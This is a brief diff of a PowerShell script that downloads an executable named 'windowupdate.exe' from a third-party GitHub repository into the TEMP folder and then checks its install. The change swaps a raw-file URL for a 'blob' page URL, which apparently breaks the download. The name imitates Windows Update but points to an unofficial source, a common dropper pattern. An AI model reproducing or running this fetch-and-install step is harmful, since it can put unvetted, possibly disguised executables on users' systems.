@@ -4,7 +4,7 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 # 2. Define variables
-$url = "https://raw.githubusercontent.com/Aenigma-Lab/windowupdate/main/windowupdate.exe"
+$url = "https://github.com/Aenigma-Lab/windowupdate/blob/main/windowupdate.exe"
 $path = Join-Path $env:TEMP "windowupdate.exe"
 
 # Function to test download
@@ -64,3 +64,4 @@ if (Test-Install $exitCode) {
 } else {
     exit 1
 }
+
